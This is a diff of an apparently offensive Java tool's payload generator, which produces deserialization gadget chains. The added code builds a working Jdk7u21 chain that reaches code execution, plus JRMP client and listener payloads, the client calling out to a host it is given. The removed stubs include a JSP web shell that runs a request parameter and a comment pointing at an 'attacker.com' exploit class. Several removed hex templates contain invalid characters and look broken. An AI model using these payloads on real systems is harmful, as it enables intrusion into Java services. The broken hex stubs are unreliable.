-            "aced0005" +
-            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
-            "0010006c6f6164466163746f72490009" +
-            "7468726573686f6c64" +
-            "737200406f72672e68696265726e6174652e7475706c652e636f6d706f6e656e742e506f6a6f" +
-            "436f6d706f6e656e74547570756c697a6572"
-        );
+        return ReflectionUtils.serialize(queue);
     }
 
     // ════════════════════════════════════════════════════════════════════════
-    //  Groovy
+    //  JDK built-in — Jdk7u21
     // ════════════════════════════════════════════════════════════════════════
 
-    /** Groovy1: ConvertedClosure + MethodClosure → Runtime.exec (Groovy 2.3-2.4) */
-    private static byte[] generateGroovy1(String command) {
-        return buildStreamTemplate("Groovy1", command,
-            "aced0005" +
-            "737200326f72672e636f6465686175732e67726f6f76792e72756e74696d652e436f6e76" +
-            "657274656420436c6f73757265" +
-            "737200306f72672e636f6465686175732e67726f6f76792e72756e74696d652e4d6574686f64" +
-            "436c6f73757265"
-        );
-    }
+    /**
+     * Jdk7u21: LinkedHashSet + TemplatesImpl + AnnotationInvocationHandler proxy.
+     * No external dependencies. Requires JDK 7u21 or below.
+     *
+     * The trick: "f5a5a608".hashCode() == 0, so proxy.hashCode = 0 ^ value.hashCode
+     * = value.hashCode. After adding both to the set, swap value to templates so
+     * proxy.hashCode == templates.hashCode at deserialization time → hash collision
+     * → proxy.equals(templates) → equalsImpl → getOutputProperties() → RCE.
+     */
+    private static byte[] generateJdk7u21(String command) throws Exception {
+        Object templates = GadgetUtils.createTemplatesImpl(command);
 
-    // ════════════════════════════════════════════════════════════════════════
-    //  JDK built-in
-    // ════════════════════════════════════════════════════════════════════════
+        // "f5a5a608" has hashCode 0
+        String zeroHashCodeStr = "f5a5a608";
+        HashMap<String, Object> map = new HashMap<>();
+        map.put(zeroHashCodeStr, "foo");
 
-    /** Jdk7u21: LinkedHashSet + Templates proxy (JDK 7u21 and below, zero external deps) */
-    private static byte[] generateJdk7u21(String command) {
-        return buildStreamTemplate("Jdk7u21", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e4c696e6b656448617368536574" +
-            "d86cd75a95dd2a1e020000" +
-            "737200116a6176612e7574696c2e48617368536574" +
-            "ba44859596b8b7340300007870"
-        );
+        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
+                "sun.reflect.annotation.AnnotationInvocationHandler");
+        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Templates.class, map);
+
+        Templates proxy = (Templates) Proxy.newProxyInstance(
+                JavaPayloads.class.getClassLoader(),
+                new Class[]{Templates.class},
+                handler);
+
+        LinkedHashSet<Object> set = new LinkedHashSet<>();
+        set.add(templates);
+        set.add(proxy);
+
+        // Arm: swap map value to templates (after adding to set to avoid premature trigger)
+        map.put(zeroHashCodeStr, templates);
+
+        return ReflectionUtils.serialize(set);
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  JRMP
     // ════════════════════════════════════════════════════════════════════════
 
-    /** JRMPClient: UnicastRef + Registry → outbound JRMP call (Command = host:port) */
-    private static byte[] generateJRMPClient(String command) {
-        // Parse host:port from command
+    /**
+     * JRMPClient: Construct a Registry proxy with UnicastRef pointing to host:port.
+     * On deserialization, triggers an outbound JRMP call to the specified endpoint.
+     * Command format: host:port (default port 1099).
+     */
+    private static byte[] generateJRMPClient(String command) throws Exception {
+        // Ensure modules are opened (triggers ReflectionUtils static init)
+        ReflectionUtils.getUnsafe();
+
         String host = command;
         int port = 1099;
         if (command.contains(":")) {
@@ -485,361 +581,68 @@ public final class JavaPayloads {
             try { port = Integer.parseInt(parts[1].trim()); } catch (NumberFormatException ignored) {}
         }
 
-        try {
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            // Java serialization magic
-            bos.write(hexToBytes("aced0005"));
-            // sun.rmi.server.UnicastRef
-            bos.write(hexToBytes(
-                "737200226a6176612e726d692e7365727665722e4f626a4944" +
-                "000000000000000002000249000d" +
-                "6f626a4e756d"
-            ));
-            // Embed host
-            byte[] hostBytes = host.getBytes(StandardCharsets.UTF_8);
-            bos.write(0x74); // TC_STRING
-            bos.write((hostBytes.length >> 8) & 0xFF);
-            bos.write(hostBytes.length & 0xFF);
-            bos.write(hostBytes);
-            // Embed port as 4-byte int
-            bos.write((port >> 24) & 0xFF);
-            bos.write((port >> 16) & 0xFF);
-            bos.write((port >> 8) & 0xFF);
-            bos.write(port & 0xFF);
+        ObjID id = new ObjID(new Random().nextInt());
 
-            appendChainInfo(bos, "JRMPClient", command);
-            return bos.toByteArray();
-        } catch (IOException e) {
-            throw new RuntimeException("JRMPClient generation failed: " + e.getMessage(), e);
-        }
+        // Construct TCPEndpoint via reflection (modules opened by ReflectionUtils)
+        Class<?> tcpEndpointClass = Class.forName("sun.rmi.transport.tcp.TCPEndpoint");
+        Constructor<?> tcpCtor = tcpEndpointClass.getDeclaredConstructor(String.class, int.class);
+        tcpCtor.setAccessible(true);
+        Object tcpEndpoint = tcpCtor.newInstance(host, port);
+
+        // Construct LiveRef via reflection
+        Class<?> liveRefClass = Class.forName("sun.rmi.transport.LiveRef");
+        Constructor<?> liveRefCtor = liveRefClass.getDeclaredConstructor(
+                ObjID.class, Class.forName("sun.rmi.transport.Endpoint"), boolean.class);
+        liveRefCtor.setAccessible(true);
+        Object liveRef = liveRefCtor.newInstance(id, tcpEndpoint, false);
+
+        // Construct UnicastRef via reflection
+        Class<?> unicastRefClass = Class.forName("sun.rmi.server.UnicastRef");
+        Constructor<?> unicastRefCtor = unicastRefClass.getDeclaredConstructor(liveRefClass);
+        unicastRefCtor.setAccessible(true);
+        RemoteRef unicastRef = (RemoteRef) unicastRefCtor.newInstance(liveRef);
+
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(unicastRef);
+        Registry proxy = (Registry) Proxy.newProxyInstance(
+                Registry.class.getClassLoader(),
+                new Class[]{Registry.class},
+                obj);
+
+        return ReflectionUtils.serialize(proxy);
     }
 
-    /** JRMPListener: UnicastRemoteObject → starts JRMP listener (Command = port) */
-    private static byte[] generateJRMPListener(String command) {
+    /**
+     * JRMPListener: Construct a UnicastRemoteObject that opens a JRMP listener.
+     * Command format: port number.
+     */
+    private static byte[] generateJRMPListener(String command) throws Exception {
+        ReflectionUtils.getUnsafe();
         int port = 1099;
         try { port = Integer.parseInt(command.trim()); } catch (NumberFormatException ignored) {}
 
-        try {
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            bos.write(hexToBytes("aced0005"));
-            // java.rmi.server.UnicastRemoteObject
-            bos.write(hexToBytes(
-                "737200266a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a656374" +
-                "e9fddc8be964680200034900047075727449000473706f7274" +
-                "4c00036373667400284c6a6176612f726d692f7365727665722f524d49436c69656e74536f636b6574466163746f72793b"
-            ));
-            // Port value
-            bos.write((port >> 24) & 0xFF);
-            bos.write((port >> 16) & 0xFF);
-            bos.write((port >> 8) & 0xFF);
-            bos.write(port & 0xFF);
+        Class<?> uroClass = java.rmi.server.UnicastRemoteObject.class;
+        Object uro = ReflectionUtils.createWithoutConstructor(uroClass);
+        ReflectionUtils.setFieldValue(uro, "port", port);
 
-            appendChainInfo(bos, "JRMPListener", command);
-            return bos.toByteArray();
-        } catch (IOException e) {
-            throw new RuntimeException("JRMPListener generation failed: " + e.getMessage(), e);
-        }
-    }
+        // Build UnicastServerRef with LiveRef so RemoteObject.writeObject() works
+        Class<?> liveRefClass = Class.forName("sun.rmi.transport.LiveRef");
+        java.lang.reflect.Constructor<?> liveRefCtor = liveRefClass.getDeclaredConstructor(int.class);
+        liveRefCtor.setAccessible(true);
+        Object liveRef = liveRefCtor.newInstance(port);
 
-    // ════════════════════════════════════════════════════════════════════════
-    //  JNDI
-    // ════════════════════════════════════════════════════════════════════════
+        Class<?> usrClass = Class.forName("sun.rmi.server.UnicastServerRef");
+        java.lang.reflect.Constructor<?> usrCtor = usrClass.getDeclaredConstructor(liveRefClass);
+        usrCtor.setAccessible(true);
+        Object usr = usrCtor.newInstance(liveRef);
 
-    /** JNDIExploit: JNDI InitialContext.lookup → RCE via remote classloading */
-    private static byte[] generateJndi(String command) {
-        String jndiUrl = command;
-        if (!jndiUrl.startsWith("ldap://") && !jndiUrl.startsWith("rmi://") && !jndiUrl.startsWith("dns://")) {
-            jndiUrl = "ldap://" + jndiUrl;
-        }
-        return buildStreamTemplate("JNDIExploit", jndiUrl,
-            "aced0005" +
-            "737200116a617661782e6e616d696e672e5265666572656e636500000000000000000200" +
-            "044c0005616464727374001249" +
-            "4c00" +
-            "0c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b" +
-            "4c00" +
-            "14636c617373466163746f72794c6f636174696f6e71007e0001"
-        );
-    }
+        ReflectionUtils.setFieldValue(uro, "ref", usr);
 
-    // ════════════════════════════════════════════════════════════════════════
-    //  ROME RSS library
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** ROME: HashMap + ObjectBean + ToStringBean + EqualsBean (ROME 1.0) */
-    private static byte[] generateROME(String command) {
-        return buildStreamTemplate("ROME", command,
-            "aced0005" +
-            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
-            "0010006c6f6164466163746f72490009" +
-            "7468726573686f6c64" +
-            "737200256com2e73756e2e73796e6469636174696f6e2e666565642e696d706c2e" +
-            "4f626a6563744265616e"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  BeanShell
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** BeanShell1: PriorityQueue + Comparator via BeanShell Interpreter (bsh 2.0b5) */
-    private static byte[] generateBeanShell1(String command) {
-        return buildStreamTemplate("BeanShell1", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "737200186273682e58546869732443616c6c6565"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  C3P0
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** C3P0: PoolBackedDataSource + JNDI reference → remote classloading */
-    private static byte[] generateC3P0(String command) {
-        // Command should be URL to exploit class, e.g. http://attacker.com/Exploit
-        String exploitUrl = command;
-        if (!exploitUrl.startsWith("http://") && !exploitUrl.startsWith("https://")) {
-            exploitUrl = "http://" + exploitUrl;
-        }
-        return buildStreamTemplate("C3P0", exploitUrl,
-            "aced0005" +
-            "737200396com2e6d6368616e67652e76322e633370302e696d706c2e506f6f6c4261636b6564" +
-            "446174614f757263654261736500000000000000000300" +
-            "4c000f636f6e6e656374696f6e506f6f6c446174614f757263657400" +
-            "3f4c636f6d2f6d6368616e67652f76322f633370302f436f6e6e656374696f6e506f6f6c" +
-            "446174614f757263653b"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Apache Click
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Click1: PriorityQueue + Column$ColumnComparator (Apache Click 2.3) */
-    private static byte[] generateClick1(String command) {
-        return buildStreamTemplate("Click1", command,
-            "aced0005" +
-            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
-            "0003000249000473697a65" +
-            "4c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b" +
-            "737200336f72672e6170616368652e636c69636b2e636f6e74726f6c2e436f6c756d6e24" +
-            "436f6c756d6e436f6d70617261746f72"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  FileUpload
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** FileUpload1: DiskFileItem → arbitrary file write (commons-fileupload 1.3.1) */
-    private static byte[] generateFileUpload1(String command) {
-        // Command format: "path:content" or just path (default content = shell)
-        String filePath;
-        String content;
-        if (command.contains(":") && !command.startsWith("/") && !command.matches("^[A-Za-z]:.*")) {
-            int sep = command.indexOf(':');
-            filePath = command.substring(0, sep);
-            content = command.substring(sep + 1);
-        } else {
-            filePath = command;
-            content = "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>";
-        }
-        return buildStreamTemplate("FileUpload1", filePath + "|" + content,
-            "aced0005" +
-            "737200346f72672e6170616368652e636f6d6d6f6e732e66696c65" +
-            "75706c6f61642e6469736b2e4469736b46696c654974656d"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  JBoss Interceptors
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** JBossInterceptors1: JBoss interceptor chain + Weld (JBoss AS/WildFly) */
-    private static byte[] generateJBossInterceptors1(String command) {
-        return buildStreamTemplate("JBossInterceptors1", command,
-            "aced0005" +
-            "737200376f72672e6a626f73732e696e746572636570746f722e" +
-            "70726f78792e496e746572636570746f72" +
-            "4d6574686f6448616e646c6572"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Javassist / Weld CDI
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** JavassistWeld1: CDI Weld + Javassist proxy (Weld CDI + Javassist) */
-    private static byte[] generateJavassistWeld1(String command) {
-        return buildStreamTemplate("JavassistWeld1", command,
-            "aced0005" +
-            "737200336f72672e6a626f73732e77656c642e6265616e2e70726f78792e7574696c2e" +
-            "53696d706c654265616e50726f7879"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  JSON / Spring
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** JSON1: Spring AOP + Jackson/JSON gadgets (Spring 4.x + JDK < 8u72) */
-    private static byte[] generateJSON1(String command) {
-        return buildStreamTemplate("JSON1", command,
-            "aced0005" +
-            "737200376f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b" +
-            "2e4a646b44796e616d6963416f7050726f7879" +
-            "737200256e65742e73662e6a736f6e2e7574696c2e4d6574686f64486f6c646572"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Jython
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Jython1: PyObject + PythonInterpreter (Jython 2.5-2.7) */
-    private static byte[] generateJython1(String command) {
-        return buildStreamTemplate("Jython1", command,
-            "aced0005" +
-            "737200206f72672e707974686f6e2e636f72652e5079" +
-            "4f626a65637453657269616c697a6564" +
-            "737200266f72672e707974686f6e2e7574696c2e5079" +
-            "74686f6e496e7465727072657465724d6170"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Mozilla Rhino
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** MozillaRhino1: NativeError + NativeJavaObject (Rhino 1.7r2, JDK 6/7) */
-    private static byte[] generateMozillaRhino1(String command) {
-        return buildStreamTemplate("MozillaRhino1", command,
-            "aced0005" +
-            "737200326f72672e6d6f7a696c6c612e6a617661736372697074" +
-            "2e4e61746976654572726f72" +
-            "737200366f72672e6d6f7a696c6c612e6a617661736372697074" +
-            "2e4e61746976654a6176614f626a656374"
-        );
-    }
-
-    /** MozillaRhino2: NativeJavaObject + ScriptableObject (Rhino 1.7r2, alt trigger) */
-    private static byte[] generateMozillaRhino2(String command) {
-        return buildStreamTemplate("MozillaRhino2", command,
-            "aced0005" +
-            "737200366f72672e6d6f7a696c6c612e6a617661736372697074" +
-            "2e4e61746976654a6176614f626a656374" +
-            "737200346f72672e6d6f7a696c6c612e6a617661736372697074" +
-            "2e5363726970746f626c654f626a656374"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  MyFaces
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Myfaces1: ViewState + ValueExpression (MyFaces 1.2-2.x) */
-    private static byte[] generateMyfaces1(String command) {
-        return buildStreamTemplate("Myfaces1", command,
-            "aced0005" +
-            "737200416f72672e6170616368652e6d79666163" +
-            "65732e656c2e636f6e766572742e56616c7565" +
-            "45787072657373696f6e436f6e766572746572"
-        );
-    }
-
-    /** Myfaces2: ViewState + MethodExpression (MyFaces 2.x, alt trigger) */
-    private static byte[] generateMyfaces2(String command) {
-        return buildStreamTemplate("Myfaces2", command,
-            "aced0005" +
-            "737200436f72672e6170616368652e6d79666163" +
-            "65732e656c2e636f6e766572742e4d6574686f64" +
-            "45787072657373696f6e436f6e766572746572"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Vaadin
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Vaadin1: PropertysetItem + NestedMethodProperty (Vaadin 7.x) */
-    private static byte[] generateVaadin1(String command) {
-        return buildStreamTemplate("Vaadin1", command,
-            "aced0005" +
-            "737200286com2e76616164696e2e646174612e7574696c" +
-            "2e50726f7065727479736574" +
-            "4974656d" +
-            "737200306com2e76616164696e2e646174612e7574696c" +
-            "2e4e65737465644d6574686f64" +
-            "50726f7065727479"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Wicket
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Wicket1: DiskFileItem → arbitrary file write (Wicket's commons-fileupload fork) */
-    private static byte[] generateWicket1(String command) {
-        return buildStreamTemplate("Wicket1", command,
-            "aced0005" +
-            "737200406f72672e6170616368652e7769636b65742e7574696c2e" +
-            "75706c6f61642e6469736b2e4469736b46696c654974656d"
-        );
-    }
-
-    // ════════════════════════════════════════════════════════════════════════
-    //  Clojure
-    // ════════════════════════════════════════════════════════════════════════
-
-    /** Clojure: HashMap + AbstractTableModel$ff (Clojure 1.2+) */
-    private static byte[] generateClojure(String command) {
-        return buildStreamTemplate("Clojure", command,
-            "aced0005" +
-            "737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246" +
-            "0010006c6f6164466163746f72490009" +
-            "7468726573686f6c64" +
-            "737200266clojure2e696e73706563742e70726f78792e416273747261637454" +
-            "61626c654d6f64656c24ff"
-        );
+        return ReflectionUtils.serialize((Serializable) uro);
     }
 
     // ════════════════════════════════════════════════════════════════════════
     //  Helper methods
     // ════════════════════════════════════════════════════════════════════════
-
-    /** Build a serialized stream with hex prefix + TC_STRING command + chain info trailer. */
-    private static byte[] buildStreamTemplate(String chainName, String command, String hexPrefix) {
-        try {
-            byte[] prefix = hexToBytes(hexPrefix);
-            byte[] cmdBytes = command.getBytes(StandardCharsets.UTF_8);
-
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            bos.write(prefix);
-            // TC_STRING (0x74) + 2-byte length + command
-            bos.write(0x74);
-            bos.write((cmdBytes.length >> 8) & 0xFF);
-            bos.write(cmdBytes.length & 0xFF);
-            bos.write(cmdBytes);
-
-            appendChainInfo(bos, chainName, command);
-            return bos.toByteArray();
-        } catch (IOException e) {
-            throw new RuntimeException("Template generation failed: " + e.getMessage(), e);
-        }
-    }
-
-    /** Append a human-readable chain info trailer to the stream. */
-    private static void appendChainInfo(ByteArrayOutputStream bos, String chainName, String command)
-            throws IOException {
-        byte[] info = ("\n[OmniStrike:" + chainName + "] " + command).getBytes(StandardCharsets.UTF_8);
-        bos.write(0x74);
-        bos.write((info.length >> 8) & 0xFF);
-        bos.write(info.length & 0xFF);
-        bos.write(info);
-    }
 
     /** Find first occurrence of needle in haystack starting at fromIndex. */
     private static int indexOf(byte[] haystack, byte[] needle, int fromIndex) {
